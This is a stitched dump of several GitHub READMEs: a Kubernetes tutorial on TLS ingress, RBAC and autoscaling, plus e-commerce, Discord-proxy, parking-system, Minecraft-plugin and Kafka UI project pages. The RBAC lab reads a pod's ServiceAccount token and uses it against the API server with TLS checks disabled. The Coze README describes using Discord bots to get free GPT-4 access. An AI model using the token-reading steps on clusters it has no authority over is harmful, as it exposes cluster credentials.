cat kubia-ingress-tls.yaml
k create -f kubia-ingress-tls.yaml
# Please provide the host entry mapping in your /etc/hosts file like this:
# 192.168.64.23 my.whereami.svc
# the IP should be the IP of the traefik loadbalancer / ingress controller
curl https://my.whereami.svc
for i in $(seq 1 10) ; do curl https://my.whereami.svc; done
# the ingress controller does load balancing, although the kubia-headless is defined as the backend with serviceName: kubia-headless!
```

</p>
</details>

## Ingress with TLS

![ingress-controller](images/ingress-controller-traefik.png ""ingress-controller-traefik"")

Often we need to use an ingress object to provide path based or (sub-) domain based routing with TLS termination and other capabilities defined through annotations in the ingress resource.

By creating an ingress for a service, the ingress controller will create a single entry-point to the defined service in the ingress resource on every node in the cluster.

In the follwoing we're using the traefik ingress controller and an ingress object to provide path based or (sub-) domain based routing with TLS termination with a valid mkcert made TLS certificate on our lab environment.


<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cd ..
kn default
mkcert '*.ghost.svc'
k create secret tls ghost-secret --cert=_wildcard.ghost.svc.pem --key=_wildcard.ghost.svc-key.pem
# alternatively, if you can't or you don't want to use mkcert, you can create a selfsigned cert with:
# openssl genrsa -out tls.key 2048
# openssl req -new -x509 -key tls.key -out tls.cert -days 360 -subj /CN=my.ghost.svc
# k create secret tls ghost-secret --cert=tls.cert --key=tls.key
cat 3-ghost-deployment.yaml
k create -f 3-ghost-deployment.yaml
k expose deployment ghost --port=2368
cat 3-ghost-ingress-tls.yaml
k create -f 3-ghost-ingress-tls.yaml
# Please provide the host entry mapping in your /etc/hosts file like this:
# 192.168.64.23 my.ghost.svc admin.ghost.svc
# the IP should be the IP of the traefik loadbalancer / ingress controller
open https://my.ghost.svc
open https://admin.ghost.svc/ghost
# change the service type to LoadBalancer and access ghost with the loadbalancer IP on port 2368 or on any other node (works on k3s with trafik only), e.g.:
open http://node2:2368
# scale the deployment to have 2 replicas and see how the backend ghost backened https://admin.ghost.svc/ghost doesn't work.
```

</p>
</details>

## Multi-Container Pods

Create a Pod with two containers, both with image alpine and command ""echo hello; sleep 3600"". Connect to the second container and run 'ls'.

The easiest way to do it is to create a pod with a single container and save its definition in a YAML file and extend it with an additional container:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k run alpine-2-containers --image=alpine --restart=Never -o yaml --dry-run -- /bin/sh -c 'echo hello;sleep 3600' > alpine-pod.yaml
```

Copy/paste the container related values, so your final YAML should contain the following two containers (make sure those containers have a different name):

```YAML
containers:
  - args:
    - /bin/sh
    - -c
    - echo hello;sleep 3600
    image: alpine
    name: alpine1
    resources: {}
  - args:
    - /bin/sh
    - -c
    - echo hello;sleep 3600
    image: alpine
    name: alpine2
    resources: {}
```

```yaml
k create -f alpine-pod-2-containers.yaml # alpine-pod-2-containers.yaml is in this repo
# exec / ssh into to the alpine2 container
k exec -it alpine-2-containers -c alpine2 -- sh
ls
exit

# or just an one-liner
k exec -it alpine2 -c alpine2 -- ls

# cleanup
k delete pod alpine-2-containers
```

</p>
</details>


### Shared Volume

We'll extend the above alpine-2-containers with a shared volume of type emptyDir named `share` with a volumeMount for each container with a mountPath `/tmp/share1` and `/tmp/share2` as follow:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cat alpine-pod-share-volumes.yaml
k apply -f alpine-pod-share-volumes.yaml
k exec -it alpine-2-containers-share-volume -c alpine1 -- sh
touch /tmp/share1/sharefile
echo ""test-share1"" > /tmp/share1/sharefile
cat /tmp/share1/sharefile
exit
k exec -it alpine-2-containers-share-volume -c alpine2 -- cat /tmp/share2/sharefile
```

</p>
</details>

## Security

Kubernetes Security is a huge topic and security hardening is a nice problem which everyone has to implement according to their security requirements and the governance model of their organization. We're going only to scratch the surface of K8s security here and highly recommend to go through the following resources by Michael Hausenblas, Liz Rice and the community.

https://kubernetes-security.info/

https://learn.hashicorp.com/vault/getting-started-k8s/sidecar

https://github.com/k8s-sec/k8s-sec.github.io


### Service Accounts

In K8s each namespace has a default ServiceAccount, named `default`. A ServiceAccount is a namespaced resource used by containers running in a Pod, to communicate with the API server of the Kubernetes cluster. ServiceAccounts with limited permissions are often used to apply the principle of least priviledge.

```bash
k get sa --all-namespaces | grep default
k get sa default -o yaml
k get secret default-<press tab> -o yaml
```

The data key of this Secret has several key/pairs:

```yaml
apiVersion: v1
kind: Secret
data:
  ca.crt: LS0tLS1CRUdJTi...
  namespace: ZGVmYXVsdA==
  token: ZXlKaGJHY2lP...
metadata:
  annotations:
    kubernetes.io/service-account.name: default
...
```

The token is the Base64 encoding of the JWT used to authenticate against the API server.
Let's get the token and head to jwt.io and use the debugger to decode the token.

```bash
kubectl run -it alpine --restart=Never --image=alpine -- sh
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
exit
open https://jwt.io/
```

Paste the token and get the payload, which looks similar to this:

```
{
  ""iss"": ""kubernetes/serviceaccount"",
  ""kubernetes.io/serviceaccount/namespace"": ""default"",
  ""kubernetes.io/serviceaccount/secret.name"": ""default-token-24pbl"",
  ""kubernetes.io/serviceaccount/service-account.name"": ""default"",
  ""kubernetes.io/serviceaccount/service-account.uid"": ""147e134a-43d0-4c76-ad01-bccc59f8acb9"",
  ""sub"": ""system:serviceaccount:default:default""
}
```

We can see the service account default is linked to the namespace where it exists and is using the secret default-token-24pbl. This token is available in the filesystem of each container of the Pod of the attached ServiceAccount.

### Using a Custom ServiceAccount

A Service Account on its own is on not so useful, we need to provide rome rights and permissions to it through a set of rules defined through roles or cluster roles using the RBAC implementation in K8s.  


### RBAC (Role Based Access Control)

RBAC in K8s is activated by default and helps to provide access to resources (objects) like namespaces, pods, services, etc. to those Subjects or Entities like users, group or service accounts who need access to some resources and deny access to other resources who do not need access to them. RBAC increases security in K8s projects and shall be defined through a governance model in each organization (but in the theorie, you know we are all admins ;-)).

RBAC is implemented through Role, ClusterRole, RoleBinding, and ClusterRoleBinding.

#### Role

A Role defines what you or a subject can do to a set of resources, like get, set, delete, etc.A Role contains a set of rules which define a set of permissions. Roles are used to assigning permissions to resources on the namespace level.

#### ClusterRole

Similar to Role, ClusterRole can grant permissions on the Cluster Level such as giving resource permissions across all namespaces in the cluster.

#### RoleBinding and ClusterRoleBinding

RoleBinding and ClusterRoleBinding are used to grant permissions and priviledges to Subjects or Entities on the namespace (project RoleBinding) level or on the cluster level (ClusterRoleBinding).

![RBAC](images/rbac.png ""rbac"")

#### What We’ll Do

We create a new namespace myapp and a new custom ServiceAccount `mysa`, create a new role `podreader` with the permission to get and list pods and create a rolebinding `mypodviewer` to bind the ServiceAccount to the role podreader in the namespace `myapp`.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k get clusterroles | wc -l
# 62
k get clusterroles
k describe clusterrole view
k describe clusterrole view | grep pods
# the view role allows your application access to many other resources such as deployments and services.
k create namespace myapp
k -n=myapp create serviceaccount mysa
k -n myapp create role podreader --verb=get --verb=list --resource=pods
k -n myapp describe role/podreader
# nice, the role podreader can only view now, but we need to attach the role podreader to our application, represented by the service account myapp. 
k -n myapp create rolebinding mypodviewer --role=podreader --serviceaccount=myapp:mysa
k -n myapp describe rolebindings mypodviewer
k -n myapp auth can-i --as=system:serviceaccount:myapp:mysa list pods
# yes :-)
k -n myapp auth can-i --as=system:serviceaccount:myapp:mysa list services
# no :-)
```
</p>
</details>

We extend our alpine pod with the key `serviceAccountName` and the value `mysa`, apply the change and run a shell in the alpine-pod, get the toke belonging to the `mysa` ServiceAccountand use it to list the pods in the default namespace and the myapp namespace to see the differences:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml

kn myapp
cat alpine-pod-service-account.yaml
k apply -f alpine-pod-service-account.yaml
k describe pod alpine-sa
k get sa
k get secrets
k exec -it alpine-sa -- sh
apk add curl
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
curl -H ""Authorization: Bearer $TOKEN"" https://node1:6443/api/v1/namespaces/default/pods/ --insecure
curl -H ""Authorization: Bearer $TOKEN"" https://node1:6443/api/v1/namespaces/myapp/pods/ --insecure
# what works, what doesn't work?

```
</p>
</details>

#### Further reading:

[Kubernetes Tips: Using a ServiceAccount](https://medium.com/better-programming/k8s-tips-using-a-serviceaccount-801c433d0023)

#### Permission Manager

--> ToDo

## 3-Tier App (MVC)

Please read the README and the related blog post in the [subfolder](3-tier-app/README.md)  3-tier-app and try to understand and get the todo list app up and running.

# Day 2 Operation

Day 2 operation is mainly about implementing some principles like selfhealing and autoscaling for our apps AND the infrastructure components like nodes and K8s components itself and define resources limits, liveness and readiness probes for our apps, run continious security auditing, apply GitOps principles and style, etc.

In this first section we'll go through app auto scaling with Horizontal Pod Autoscaler.

![hpa](images/pod-autoscaling-hpa.png ""hap"")

## Pod AutoScaling with HPA (Horizontal Pod Autoscaler)

```bash
kubectl run hpa-example --image=k8s.gcr.io/hpa-example --requests=cpu=200m --expose --port=80
# create HPA based on CPU usage
kubectl autoscale deployment hpa-example --cpu-percent=50 --min=1 --max=10
# In another terminal run
kubectl run -i --tty generate-load --image=busybox /bin/sh
# Inside the above container run a loop bash command to stress the CPU
while true; do wget -q -O- http://hpa-example.default.svc.cluster.local; done
# Check HPA Status
kubectl get hpa
```

- [Simplify Kubernetes day 2 ops with Palette Cluster Profiles](https://www.spectrocloud.com/blog/kubernetes-day-2-operations-with-cluster-profiles)

## Labs and exercises and hackaton:

[Labs and exercises and hackaton repo](./Labs-and-exercises/)  to help you learn Kubernetes. 

## GitOps

GitOps is an operating model for Kubernetes and other cloud native technologies. It provides a set of best practices that unifies deployment, management, and monitoring for clusters and applications. Another way to put it is: a path towards a developer experience for managing applications; where end-to-end CI and CD pipelines and Git workflows

- https://www.eksworkshop.com/docs/automation/gitops/

- https://medium.com/@seifeddinerajhi/gitops-ci-cd-automation-workflow-using-github-actions-argocd-and-helm-charts-deployed-on-k8s-3811b253030b


- [Provides our opinionated point of view on how GitOps can be used to manage the infrastructure, services and application layers of K8s based systems](https://github.com/cloud-native-toolkit/multi-tenancy-gitops): GitOps Production Deployment Guide

## TroubleShooting

- [COMMON KUBERNETES ERRORS AND HOW THEY IMPACT CLOUD DEPLOYMENTS](https://cloudtweaks.com/2023/01/common-kubernetes-errors/)

- [Exit Codes In Containers & Kubernetes – The Complete Guide](https://komodor.com/learn/exit-codes-in-containers-and-kubernetes-the-complete-guide/)

- [How to identify and troubleshoot common Kubernetes errors](https://newrelic.com/blog/how-to-relic/monitoring-kubernetes-part-three)

- [Kubernetes Troubleshooting: 5 Common Errors & How to Fix Them](https://lumigo.io/kubernetes-troubleshooting/)

- [Kubernetes Troubleshooting – The Complete Guide](https://komodor.com/learn/kubernetes-troubleshooting-the-complete-guide/)


- [A visual guide on troubleshooting Kubernetes deployments](https://learnk8s.io/troubleshooting-deployments)

- [Kubernetes Troubleshooting: Effective Strategies for Unraveling the Puzzle](https://www.groundcover.com/kubernetes-troubleshooting)


- [node-problem-detector](https://github.com/kubernetes/node-problem-detector): This is a place for various problem detectors running on the Kubernetes nodes.


- [Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat): ""Vulnerable by Design"" cluster environment to learn and practice Kubernetes security using an interactive hands-on playground 🚀

##  Kubernetes in the cloud:

### AWS EKS

- [Terraform module to create AWS Elastic Kubernetes (EKS) resources](https://github.com/terraform-aws-modules/terraform-aws-eks)

- [This project](https://github.com/aws-ia/terraform-aws-eks-blueprints) contains a collection of Amazon EKS cluster patterns implemented in Terraform that demonstrate how fast and easy it is for customers to adopt Amazon EKS. The patterns can be used by AWS customers, partners, and internal AWS teams to configure and manage complete EKS clusters that are fully bootstrapped with the operational software that is needed to deploy and operate workloads.

- [EKS Workshop](https://www.eksworkshop.com/)

- [ (Amazon EKS) Best Practices](https://aws.github.io/aws-eks-best-practices/): A best practices guide for day 2 operations, including operational excellence, security, reliability, performance efficiency, and cost optimization.

- [AWS EKS Kubernetes - Masterclass | DevOps, Microservices](https://github.com/stacksimplify/aws-eks-kubernetes-masterclass)


### Azure AKS

- [Azure AKS Kubernetes Masterclass](https://github.com/stacksimplify/azure-aks-kubernetes-masterclass).

- [Official repository for the AKS Landing Zone Accelerator program](https://github.com/Azure/AKS-Landing-Zone-Accelerator): Azure Landing Zone Accelerators are architectural guidance, reference architecture, reference implementations and automation packaged to deploy workload platforms on Azure at Scale and aligned with industry proven practices.

- [Azure Kubernetes Service Checklist](https://www.the-aks-checklist.com/): This checklist contains a large set of best practices and some of them may not be relevant to your context and thus the rating may be incorrect in your case. Please choose and apply them wisely.


### Google GKE

- [Configures opinionated GKE clusters in terraform](https://github.com/terraform-google-modules/terraform-google-kubernetes-engine)

- [Sample applications for Google Kubernetes Engine (GKE)](https://github.com/GoogleCloudPlatform/kubernetes-engine-samples)


### Common

- [Elastic Cloud on Kubernetes](https://github.com/elastic/cloud-on-k8s): Elastic Cloud on Kubernetes automates the deployment, provisioning, management, and orchestration of Elasticsearch, Kibana, APM Server, Enterprise Search, Beats, Elastic Agent, Elastic Maps Server, and Logstash on Kubernetes based on the operator pattern.


## playgrounds 

- [Kubernetes Playground](https://github.com/netgroup/kubernetes-playground) - Let's play with Kubernetes in a safe sandbox.

- [Gluster file system with Kubernetes](https://github.com/bwolf/gluster-k8s-playground) - Playground to experiment with Gluster and Kubernetes.

- [A standalone Kubernetes cluster](https://github.com/nextbreakpoint/kubernetes-playground)  - Scripts for creating a standalone Kubernetes cluster for development.

- [Playground](https://labs.play-with-k8s.com/) -  Play with Kubernetes is a playground which allows users to run K8s clusters in a matter of seconds.

## CNCF certifications:

- [Kubernetes CKS Full Course](https://www.youtube.com/watch?v=d9xfB5qaOfg) Theory + Practice + Browser Scenarios by Kim Wuestkamp

- [Kubernetes CKS Course Environment](https://github.com/killer-sh/cks-course-environment)

- [Certified Kubernetes Security Specialist - CKS](https://github.com/walidshaari/Certified-Kubernetes-Security-Specialist): Curated resources help you prepare for the CNCF/Linux Foundation CKS 2021 ""Kubernetes Certified Security Specialist"" Certification exam.

- [Kubernetes Certified Administration](https://github.com/walidshaari/Kubernetes-Certified-Administrator): Online resources that will help you prepare for taking the CNCF CKA 2020 ""Kubernetes Certified Administrator"" Certification exam.

- [CKA preparation](https://github.com/alijahnas/CKA-practice-exercises): This is a guide for passing the CNCF Certified Kubernetes Administrator (CKA) with practice exercises.

- [CKA Exercises](https://github.com/chadmcrowell/CKA-Exercises): Practice for the Certified Kubernetes Administrator (CKA) Exam.

## Kubernetes IAC:

Certainly! Here's a list of some popular tools for managing Kubernetes Infrastructure as Code (IAC):

1. **Helm:**
   - Overview: Helm is a package manager for Kubernetes that simplifies the deployment and management of applications.
   - GitHub: [Helm GitHub Repository](https://github.com/helm/helm)

2. **Kustomize:**
   - Overview: Kustomize is a tool for customizing Kubernetes manifests, allowing you to manage configuration variations in a declarative way.
   - GitHub: [Kustomize GitHub Repository](https://github.com/kubernetes-sigs/kustomize)

3. **Kubeconfig Management:**
   - Tools like `kubectx` and `kubens` help manage and switch between multiple Kubernetes contexts and namespaces.
   - GitHub: [kubectx GitHub Repository](https://github.com/ahmetb/kubectx)

4. **Kubeval:**
   - Overview: Kubeval is a tool for validating Kubernetes manifests against the Kubernetes API schema.
   - GitHub: [Kubeval GitHub Repository](https://github.com/instrumenta/kubeval)

5. **Kops:**
   - Overview: Kops helps you create, destroy, upgrade, and maintain Kubernetes clusters on AWS.
   - GitHub: [Kops GitHub Repository](https://github.com/kubernetes/kops)

6. **Terraform:**
   - Overview: While not specific to Kubernetes, Terraform is widely used for IAC and can be used to provision and manage Kubernetes infrastructure.
   - Website: [Terraform](https://www.terraform.io/)

7. **Pulumi:**
   - Overview: Pulumi allows you to define infrastructure as code using familiar programming languages, including TypeScript, Python, and Go.
   - GitHub: [Pulumi GitHub Repository](https://github.com/pulumi/pulumi)

8. **Helmfile:**
   - Overview: Declaratively deploy your Kubernetes manifests, Kustomize configs, and Charts as Helm releases. Generate all-in-one manifests for use with ArgoCD.
   - GitHub: [Kubeform GitHub Repository](https://github.com/helmfile/helmfile)

9. **Jsonnet:**
   - Overview: Jsonnet is a data templating language that can be used to generate Kubernetes manifests.
   - GitHub: [Jsonnet GitHub Repository](https://github.com/google/jsonnet)

10. **Skaffold:**
    - Overview: Skaffold is a command-line tool that facilitates continuous development for Kubernetes applications.
    - GitHub: [Skaffold GitHub Repository](https://github.com/GoogleContainerTools/skaffold)

This is not an exhaustive list, and the choice of tools depends on your specific use case and preferences. Always check the official documentation and community support for each tool for the most accurate and up-to-date information.

### Coming next

* Cluster Operation and maintanance

* Nodes AutoScaling and AutoSpotting (on AWS)

* Logging and Monitoring with Operators

* Cloud Native Storage for Statefulsets

* Backup & Recovery

* Service Mesh


## ❤ Show your support

Give a ⭐️ if this project helped you, Happy learning!
",0,0,76,Apache-2.0
zeasin/qihangerp-oms,master,"# 启航电商OMS订单处理系统

## 一、系统介绍

启航电商OMS订单处理系统支持多平台多店铺订单、售后、商品等管理，目前已接入：淘宝、京东、拼多多、抖店、微信小店，后续会继续接入快手小店、小红书等。

主体功能包括：
+ 订单管理：店铺订单同步、管理。
+ 发货管理：电子面单打印、发货记录、物流跟踪等。
+ 售后管理：店铺售后同步、售后处理（补发、换货、退货处理）等。
+ 店铺管理：店铺管理、店铺商品管理（拉取店铺商品、ERP关联）。

**基本上覆盖了电商网店管理日常业务，可使用接口对接内部ERP系统。**

**订单打单（电子面单打印）已支持：淘宝、京东、拼多多、抖店、微信小店**

本项目采用SpringCloudAlibaba微服务架构+Vue2+Element开发。


<img src=""preview.png"" />


## 二、关键流程

### 2.1 关联商品SKU
```mermaid
graph TD
    A[添加ERP商品SKU信息] -->B(拉取店铺商品)
    B --> C[店铺商品SKU关联ERP商品SKU]
    C --> E(完成)
```


### 2.2 处理订单（发货）
```mermaid
graph TD
    A[店铺订单拉取] -->B(店铺订单推送到OMS订单中心)
    B --> C(后台任务:订单商品数据自动关联ERP系统SKU)
    C --> D[接口推送/手动推送:将订单推送给ERP系统-外部系统]
    D --> E[接收/手动录入ERP系统发货单号]
    E --> F[变更OMS订单状态 - 将发货信息推送给平台店铺]
    F --> G(完成)
```


### 2.3 处理售后

```mermaid
graph TD
    A[店铺退款拉取] -->B(店铺退款推送到OMS售后中心)
    B --> D[接口推送/手动推送:将订单推送给ERP系统-外部系统]
    D --> E[接收/手动录入ERP系统处理售后结果:补发/换货/退货]
    E --> F[变更OMS售后状态 - 将售后结果信息推送给平台店铺]
    F --> G(完成)
```


## 三、功能模块

### 1、订单管理
+ 从平台同步订单
+ 订单发货
  + 获取订单收货地址信息
  + 推送物流信息到平台
+ 订单备注修改

### 2、发货管理
+ 电子面单打印
+ 订单发货

### 3、售后管理
+ 从平台同步售后列表
+ 售后处理（同意、备注）


### 4、店铺管理
+ 从平台同步商品信息
+ 关联ERP sku

**支持多店铺管理**



## 四、软件架构
### 1、开发环境级组件
#### 1.1 开发环境
+ Jdk：17
+ Nodejs：v16.20.0

#### 1.2 项目组件
##### 后端核心组件
+ SpringBoot：3.0.2
  + spring-boot-starter-security
+ SpringCloudAlibaba：2022.0.0.0
  + Nacos
  + SpringCloud Gateway
  + spring-cloud-starter-loadbalancer

##### 前端框架及组件
+ vue2
+ element

#### 1.3、存储及中间件

+ MySQL8
+ Redis：7.x
+ Kafka
+ Nacos：2.2.0（配置中心、注册中心）
+ Sentinel（分布式流量治理组件）

  `java -Dserver.port=8888 -Dcsp.sentinel.dashboard.server=localhost:8888 -Dproject.name=sentinel-dashboard -jar sentinel-dashboard.jar`


### 2、项目结构
#### 2.1 core
项目公共模块包括：

+ `common`:公共类型

+ `security`:公共权限验证模块

#### 2.2 api
网关项目，负责微服务接口转发，前端统一通过网关调用其他微服务接口；

采用`gateway`进行api分发，引入Sentinel进行流量治理。

#### 2.3 sys-api
项目系统微服务，主要功能包括：

+ 用户
+ 菜单

#### 2.4 oms-api
oms主功能微服务，主要功能包括：

+ 队列消息处理（订单消息、退款消息）
+ 订单接口
+ 退款接口
+ 店铺接口

#### 2.5 open-api
各开放平台微服务
##### 2.5.1 tao-api
淘宝开放平台接口api

##### 2.5.2 jd-api
京东开放平台接口api

##### 2.5.3 dou-api
抖店开放平台接口api

##### 2.5.4 pdd-api
拼多多开放平台接口api

##### 2.5.5 wei-api
微信视频号小店开放平台接口api


##### 2.5.6 kwai-api
快手小店开放平台接口api


### 3、运行说明
#### 3.1、启动环境

1. 启动MySQL8
2. 启动Redis7
3. 启动Sentinel1.8.7控制台
4. 启动Nacos2.2.0
5. 启动Kafka

#### 3.2、导入数据库
+ 创建数据库`qihang-erp`
  + 1、导入数据库结构：sql脚本`docs\qihang-erp.sql`
  + 2、导入系统数据：sql脚本`docs\qihang-erp-sys.sql`

#### 3.3、启动服务(项目)
1.  启动开放平台业务微服务（tao-api、jd-api、dou-api、pdd-api等平台接口api微服务）
2.  启动sys-api、oms-api微服务
3.  启动微服务网关（api）

#### 3.4、运行前端
+ Nodejs版本：v16.20.0
+ 进入`vue`文件夹
+ 运行`npm install` 
+ 运行`npm run dev`
+ 浏览网页`http://localhost`

### 4、项目部署

#### 4.1 打包

##### 后端打包
`mvn clean package`

##### 前端打包
`pnpm run build:prod`


#### 4.2 Nginx配置
```
# 上传文件至远程服务器
将打包生成在 `dist` 目录下的文件拷贝至 `/usr/share/nginx/html` 目录

# nginx.cofig 配置
server {
	listen     80;
	server_name  localhost;
	location / {
			root /usr/share/nginx/html;
			index index.html index.htm;
	}
	# 反向代理配置
	location /prod-api/ {
			proxy_pass http://127.0.0.1:8080/; # 替换成你的后端网关API地址
	}
}
```

## 四、一起交流

**感谢大家的关注与支持！希望利用本人从事电商10余年的经验帮助到大家提升工作效率！**

💖 如果觉得有用记得点 Star⭐


💖 欢迎一起交流！


<img src=""docs/知识星球.jpg"" width=""300px"" />




",0,1,1,
oddfar/coze-discord,master,"
<p align=""center""><a href=""https://oddfar.com/"" target=""_blank"" rel=""noopener noreferrer""><img width=""180"" src=""https://note.oddfar.com/img/web.png"" alt=""logo""></a></p>

<p align=""center"">
  <a href=""https://github.com/oddfar/coze-discord/stargazers""><img src=""https://img.shields.io/github/stars/oddfar/coze-discord.svg""></a>
	<a href=""https://github.com/oddfar/coze-discord/blob/master/LICENSE""><img src=""https://img.shields.io/github/license/oddfar/coze-discord.svg""></a>
</p>


<p align=""center"">使用两个Discord机器人代理Coze服务，免费使用GPT-4高级模型的API功能</p>

<h2 align=""center"">coze-discord</h2>

## 介绍

**项目已失效，仅供学习**

简介：Coze 的机器人集成了 GPT-4 等模型，并可以发布 Discord 等平台。Discord 机器人能够发送和接收消息，我们使用了两个机器人：一个与 Coze 机器人进行绑定的应用，另一个负责向 Coze 机器人发送消息和获取消息。通过这种方式，我们可以免费使用 GPT-4，并拓展 API 等其他功能。

功能如下：

- [x] 支持 api 方式调用
- [x] 对话支持流式返回
- [x] 支持对话指定 `Discord` 频道、子频道，实现对话隔离支
- [x] 支持创建 `Discord` 频道、子频道、线程
- [x] 对话支持文生图

未来计划：

- [ ] <s>对话支持图生文</s>
- [ ] <s>支持和 `openai` 的对话接口、GPT4V识图接口...</s>
- [ ] <s>支持配置多个机器人</s>

若您有好的想法，发现一些 **BUG** 并修复了，欢迎提交 **Pull Request** 参与开源贡献

## 使用教程

使用教程：<https://oddfar.github.io/campus-doc/pages/b31421/>

部署教程：<https://oddfar.github.io/campus-doc/pages/60eaa2/>

> 平台

Coze: <https://www.coze.com/>

Discord Api: <https://discord.com/developers/docs/intro>

Discord SDK JDA: <https://jda.wiki/>



## 演示图

![image-20240201225345802](https://gcore.jsdelivr.net/gh/oddfar/static/discord/01.介绍.assets/image-20240201225345802.png)

![image-20240201225419850](https://gcore.jsdelivr.net/gh/oddfar/static/discord/01.介绍.assets/image-20240201225419850.png)

![image-20240202153712692](https://gcore.jsdelivr.net/gh/oddfar/static/discord/01.介绍.assets/image-20240202153712692.png)

## 鸣谢

感谢以下项目的开源的付出：

- coze-discord-proxy

  GO版本：https://github.com/deanxv/coze-discord-proxy/

",1,4,1,MIT
giteecode/smartparkingPublic,master,"## 基于Java+Springboot+vue的智能停车场管理系统(源代码+数据库+9000字论文)119

## 一、系统介绍
本项目前后端不分离

- 登录、控制台、停车场管理、车牌识别、车辆管理

- 角色管理、系统菜单、全局配置、停车记录、财务管理

- 控制台管理、系统日志、账号管理、用户管理、合作单位管理、密码修改、个人信息

### 论文截图
![contents](./picture/picture1.png)

## 二、所用技术

后端技术栈：Springboot、jpa、Mysql、Maven、百度api

前端技术栈：Html、vue.js、BootStrap、Echarts、jQuery

## 三、环境介绍

基础环境 :IDEA/eclipse, JDK1.8, Mysql5.7及以上,Maven3.6

所有项目以及源代码本人均调试运行无问题 可支持远程调试运行

## 四、页面截图
![contents](./picture/picture2.png)
![contents](./picture/picture3.png)
![contents](./picture/picture4.png)
![contents](./picture/picture5.png)
![contents](./picture/picture6.png)
![contents](./picture/picture7.png)
![contents](./picture/picture8.png)
![contents](./picture/picture9.png)
![contents](./picture/picture10.png)
![contents](./picture/picture11.png)
![contents](./picture/picture12.png)
![contents](./picture/picture13.png)
![contents](./picture/picture14.png)
![contents](./picture/picture15.png)
![contents](./picture/picture16.png)
![contents](./picture/picture17.png)
![contents](./picture/picture18.png)
![contents](./picture/picture19.png)
![contents](./picture/picture20.png)

## 五、浏览地址

后端登录：http://localhost:8100

账户密码：admin/admin

## 六、部署教程
1. 使用Navicat或者其它工具，在mysql中创建对应名称的数据库，并执行项目的sql文件
2. 使用IDEA/Eclipse导入smart-parking项目，若为maven项目请选择maven，等待依赖下载完成
3. 修改application-dev.properties里面的数据库配置和百度api配置，启动后端项目

",0,3,1,
Jsinco/BreweryX,master,"# BreweryX ![License: GPLv3](https://img.shields.io/badge/license-GPLv3-blue) [![Releases](https://img.shields.io/github/v/release/Jsinco/BreweryX)](https://github.com/Jsinco/BreweryX/releases/latest)

#### BreweryX is an actively maintained fork of Brewery which includes many new features and gives support to the inactive plugin. Find more info below.

### [Wiki & Docs](https://brewery.lumamc.net) **|** [Discord Support](https://discord.gg/aV5Am7uxWr) **|** [Download Brewery**X**](https://www.spigotmc.org/resources/breweryx.114777/)

---

> [!IMPORTANT]
> Brewery**X** is based off of an over **decade** old plugin called Brewery. A lot of this code is old and awful to look at. If you see poorly written code, don't assume the worst because chances are, I didn't even write it. Thanks


### Brewery is a Plugin for an alternate brewing process, including alcoholic Potions.

Works with Spigot, Paper, and Folia from `1.21.1` to `1.8.x`!

The somewhat difficult brewing process rewards you with a diversity of Potions, which, through their effects, create a drunkenness that has never existed in Minecraft before.

---
<h3 style=""text-align: center;"">Original Brewery Features</h3>

- Brew alcoholic Drinks, that actually can make you drunk
- Drunk people will stagger, the chat is influenced, effects and more
- Wake up at /home after a long night of drinking
- Lower quality brewed drinks have downsides like hangover
- Process of brewing with different steps like fermenting, distilling, aging
- Refine the quality, until the Drinks are perfect
- Master the brewing of even the most difficult Drinks
- Create your own Recipes including ingredients, properties and creation process
- Configurable influence on the chat


---
<h3 style=""text-align: center;"">Brewery<ins>X</ins> features</h3>

- Customizable plugin prefix
- Full RGB support for 1.16+
- Multi-puke items
- Ability to specify custom ingredients by CustomModelData
- Addons! (Things like **[Recipes](https://www.spigotmc.org/resources/breweryrecipes-breweryx-addon.114897/)**)
- Support for ItemsAdder & Oraxen items!
- Patches like **[this](https://github.com/DieReicheErethons/Brewery/issues/541)**
- Support for Brewery and BreweryX in our **[discord](https://discord.gg/6VzjPSNRex)**
- **[Folia](https://github.com/PaperMC/Folia)** support
- **[PlaceholderAPI](https://www.spigotmc.org/resources/placeholderapi.6245/)** support
- And more!

### **Find more info on the [Spigot page](https://www.spigotmc.org/resources/breweryx.114777/) for this plugin.**

#### Also see  [Legacy Wiki](https://github.com/DieReicheErethons/Brewery/wiki) | [Releases](https://github.com/Jsinco/BreweryX/releases)

---

# API

### Coming soon:

- [Depenizen support](https://github.com/DenizenScript/Depenizen/pull/430) for Denizen Scripters

### For Java developers, use any release jar locally or get any release from [Jitpack](https://jitpack.io/#Jsinco/BreweryX)

## Maven

```XML
<repository>
   <id>jitpack.io</id>
   <url>https://jitpack.io</url>
</repository>

<dependency>
   <groupId>com.github.Jsinco</groupId>
   <artifactId>BreweryX</artifactId>
   <version>3.2.5</version>
   <scope>provided</scope>
</dependency>
```

## Gradle

```groovy
repositories {
    maven { url 'https://jitpack.io' }
}

dependencies {
    implementation 'com.github.Jsinco:BreweryX:3.2.1'
}
```
### License

This Project is licensed under GPLv3
",28,18,8,GPL-3.0
kafbat/kafka-ui,main,"<div align=""center"">
<img src=""documentation/images/logo_new.png"" alt=""logo""/>
<h3>Kafbat UI</h3>

Versatile, fast and lightweight web UI for managing Apache Kafka® clusters.
</div>

<div align=""center"">
<a href=""https://github.com/kafbat/kafka-ui/blob/main/LICENSE""><img src=""https://img.shields.io/badge/License-Apache%202.0-blue.svg"" alt=""License""/></a>
<img src=""documentation/images/free-open-source.svg"" alt=""price free""/>
<a href=""https://github.com/kafbat/kafka-ui/releases""><img src=""https://img.shields.io/github/v/release/kafbat/kafka-ui"" alt=""latest release version""/></a>
<a href=""https://discord.gg/4DWzD7pGE5""><img src=""https://img.shields.io/discord/897805035122077716"" alt=""discord online number count""/></a>
<a href=""https://github.com/sponsors/kafbat""><img src=""https://img.shields.io/github/sponsors/kafbat?style=flat&logo=githubsponsors&logoColor=%23EA4AAA&label=Support%20us"" alt="""" /></a>
</div>

<p align=""center"">
    <a href=""https://ui.docs.kafbat.io/"">Documentation</a> • 
    <a href=""https://ui.docs.kafbat.io/configuration/quick-start"">Quick Start</a> • 
    <a href=""https://discord.gg/4DWzD7pGE5"">Community</a>
    <br/>
    <a href=""https://aws.amazon.com/marketplace/pp/{replaceMe}"">AWS Marketplace</a>  •
